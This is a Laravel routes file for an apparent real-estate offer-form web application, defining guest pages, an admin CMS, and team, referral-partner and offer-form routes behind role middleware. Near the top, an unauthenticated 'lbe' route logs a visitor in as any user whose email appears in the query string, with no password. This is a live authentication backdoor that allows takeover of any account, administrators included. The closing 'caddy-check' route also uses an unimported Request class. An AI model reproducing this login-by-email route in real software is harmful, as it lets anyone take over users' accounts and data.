<?php

use App\Http\Controllers\AgentController;
use App\Http\Controllers\Dash\BlogController;
use App\Http\Controllers\Dash\CMSController;
use App\Http\Controllers\Dash\OfferForms\OfferFormController;
use App\Http\Controllers\Dash\Pages\AboutController;
use App\Http\Controllers\Dash\Pages\DemoController;
use App\Http\Controllers\Dash\Pages\FaqController;
use App\Http\Controllers\Dash\Pages\HomeController;
use App\Http\Controllers\Dash\Pages\KeyFeatureController;
use App\Http\Controllers\Dash\Pages\PackageController;
use App\Http\Controllers\Dash\Pages\PricingPageController;
use App\Http\Controllers\Dash\Pages\PricingPlanController;
use App\Http\Controllers\Dash\Pages\TermsAndConditionController;
use App\Http\Controllers\Dash\TestimonialController;
use App\Http\Controllers\Dash\ReferralPartnerController;
use App\Http\Controllers\Dash\UserController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\FormBuilderController;
use App\Http\Controllers\GuestController;
use App\Http\Livewire\ReferralPartners\CreateOrUpdateReferralPartner;
use App\Http\Livewire\ReferralPartners\ReferralPartners;
use App\Http\Livewire\ReferralPartners\ReferralPartnerTypes;
use App\Models\Pages\Faq;
use Illuminate\Support\Facades\Route;
use Mailjet\LaravelMailjet\Facades\Mailjet;
use Mailjet\Resources;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


Route::get('lbe', function () {
    $user = \App\Models\User::where('email', request()->get('email', ''))->first();
    if ($user) {
        Auth::login($user);
    }

    return back();
});

Route::controller(GuestController::class)
    ->name('guest.')
    ->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/pricing', 'pricing')->name('pricing');
        Route::get('/about', 'about')->name('about');
        Route::get('/blogs', 'blog')->name('blog');
        Route::get('/terms-and-conditions', 'termsAndConditions')->name('terms-and-conditions');
        Route::get('/blog/{slug}', 'blogDetails')->name('blog-details');
        Route::get('/contact', 'contact')->name('contact');
        Route::get('/demo', 'demo')->name('demo');
        Route::get('/completed/{offerFormOffer}/pdf', 'exportCompletedFormToPDF')
            ->middleware('signed')
            ->name('completed.pdf');
        Route::controller(BlogController::class)
            ->name('blog.')
            ->prefix('blog')
            ->group(function () {
                //                Route::get('/', 'guestIndex')->name('index');
            });

        Route::get('/{offerForm}/step/{offerFormStep}/{offerFormOffer}',
            \App\Http\Livewire\OfferForms\Steps\Index::class)
            ->name('offer-form');
    });

Route::controller(DashboardController::class)
    ->name('dash.')
    ->prefix('u')
    ->middleware(['auth', 'verified'])
    ->group(function () {
        Route::get('/', 'index')->name('index');
        Route::get('/categories', \App\Http\Livewire\Categories\Index::class)->name('categories');
        Route::get('/settings', 'settings')->name('settings');
        Route::get('/clear-notifications', 'clearNotifications')->name('clear-notifications');

        Route::controller(UserController::class)
            ->middleware('role:super-admin|admin')
            ->name('users.')
            ->prefix('users')
            ->group(function () {
                Route::get('/', \App\Http\Livewire\Users\Index::class)->name('index');
                Route::get('/create', 'create')->name('create');
                Route::get('/{user}/edit', 'edit')->name('edit');
            });


        Route::controller(ReferralPartnerController::class)
            ->name('referral-partners.')
            ->prefix('referral-partners')
            ->middleware(['auth'])
            ->group(function () {

                Route::get('/', ReferralPartnerTypes::class)->name('index');

                Route::get('/{referralPartnerType}', ReferralPartners::class)->name('referral-partners-by-type');

                Route::get('/{referralPartnerType}/create', CreateOrUpdateReferralPartner::class)->name('create');

                Route::get('/{referralPartnerType}/{referralPartner}/edit', CreateOrUpdateReferralPartner::class)->name('edit');

                Route::get('/partner-list', 'partnerList')->name('partner-list');

                Route::get('/lender-advance-screen', 'lenderAdvancedScreen')->name('lender-advance-screen');
            });

        //        Route::resource(
        //            'referral-partners/{referral_partner_type}',
        //            ReferralPartnerController::class,
        //            [
        //                'names' => 'referral-partners'
        //            ])->parameters(['{referral_partner_type}' => 'referral_partners']);

        Route::controller(CMSController::class)
            ->middleware('role:super-admin|admin')
            ->name('cms.')
            ->prefix('cms')
            ->group(function () {
                Route::get('/', 'index')->name('index');
            });

        Route::resource('blogs', BlogController::class)->middleware('role:super-admin|admin');
        Route::resource('testimonials', TestimonialController::class)->middleware('role:super-admin|admin');
        Route::resource('about', AboutController::class)->middleware('role:super-admin|admin');
        Route::resource('home', HomeController::class)->middleware('role:super-admin|admin');
        Route::resource('pricing', PricingPlanController::class)->middleware('role:super-admin|admin');
        Route::resource('key-feature', KeyFeatureController::class)->middleware('role:super-admin|admin');
        Route::resource('pricing-page', PricingPageController::class)->middleware('role:super-admin|admin');
        Route::resource('faqs', FaqController::class)->middleware('role:super-admin|admin');
        Route::resource('demos', DemoController::class)->middleware('role:super-admin|admin');
        Route::resource('terms-and-conditions',
            TermsAndConditionController::class)->middleware('role:super-admin|admin');

        Route::name('teams.')
            ->prefix('teams')
            ->group(function () {
                Route::get('/', \App\Http\Livewire\Teams\Index::class)
                    ->middleware('role:super-admin|admin')
                    ->name('index');
                Route::get('/create', \App\Http\Livewire\Teams\Form::class)
                    ->middleware('role:super-admin|admin')
                    ->name('create');
                Route::get('/{team}/edit', \App\Http\Livewire\Teams\Form::class)
                    ->middleware('role:super-admin|admin')
                    ->name('edit');

                Route::get('{code}/manager', \App\Http\Livewire\Teams\Manager::class)
                    ->middleware('role:super-admin|admin|agent')
                    ->name('manager');
            });

        Route::controller(OfferFormController::class)
            ->name('offer-forms.')
            ->prefix('offer-forms')
            ->group(function () {
                Route::get('/', 'index')
                    ->middleware('role:super-admin|admin|agent')
                    ->name('index');

                Route::get('/completed', \App\Http\Livewire\OfferForms\Completed\Index::class)
                    ->middleware('role:super-admin|admin|agent|buyer|walk-in-buyer')
                    ->name('completed');

                Route::get('/completed/{offerFormOffer}', \App\Http\Livewire\OfferForms\Completed\Show::class)
                    ->middleware('role:super-admin|admin|agent|buyer|walk-in-buyer')
                    ->name('completed.show');

                Route::get('/completed/{offerFormOffer}/pdf', 'exportCompletedFormToPDF')
                    ->middleware('role:super-admin|admin|agent|buyer|walk-in-buyer')
                    ->name('completed.pdf');

                Route::get('/create', 'create')
                    ->middleware('role:super-admin|admin|agent')
                    ->name('create');
                Route::get('/{offer_form}/edit', 'edit')
                    ->middleware('role:super-admin|admin|agent')
                    ->name('edit');

                Route::get('/{offerFormOffer}/prefill', \App\Http\Livewire\OfferForms\Prefill::class)
                    ->middleware('role:super-admin|admin|agent')
                    ->name('prefill');

                // Offer Form Steps
                Route::get('/{offerForm}/step/{offerFormStep}/edit', \App\Http\Livewire\OfferForms\Steps\Form::class)
                    ->middleware('role:super-admin|admin|agent')
                    ->name('step.edit');
                Route::get('/{offerForm}/step/{offerFormStep}/preview',
                    \App\Http\Livewire\OfferForms\Steps\Index::class)
                    ->middleware('role:super-admin|admin|agent')
                    ->name('step.preview');
            });

        Route::controller(\App\Http\Controllers\Api\WorlController::class)
            ->name('world.')
            ->group(function () {
                Route::get('countries', 'countries')->name('countries');
                Route::get('states', 'states')->name('states');
                Route::get('cities', 'cities')->name('cities');
                Route::get('zipcodes', 'zipcodes')->name('zipcodes');
            });
    });


Route::controller(AgentController::class)
    ->name('agent.')
    ->prefix('agent')
    ->middleware(['auth'])
    ->group(function () {

        Route::get('/', 'index')->name('index');
        Route::get('/settings', 'settings')->name('settings');
        Route::get('/view-completed-form', 'viewCompletedForm')->name('viewCompletedForm');

    });


Route::controller(FormBuilderController::class)
    ->name('form-builder.')
    ->prefix('form-builder')
    ->middleware(['auth'])
    ->group(function () {

        Route::get('/', 'index')->name('index');

    });


require __DIR__ . '/auth.php';

Route::middleware(['auth:sanctum', 'verified'])->get('/dashboard', function () {
    return '';
})->name('dashboard');

Route::get('/caddy-check', function (Request $request) {
    $authorizedDomains = [
        'laravel.test',
        'offerform.com',
        // Add subdomains here
    ];

    if (in_array($request->query('domain'), $authorizedDomains)) {
        return response('Domain Authorized');
    }

    // Abort if there's no 200 response returned above
    abort(503);
});
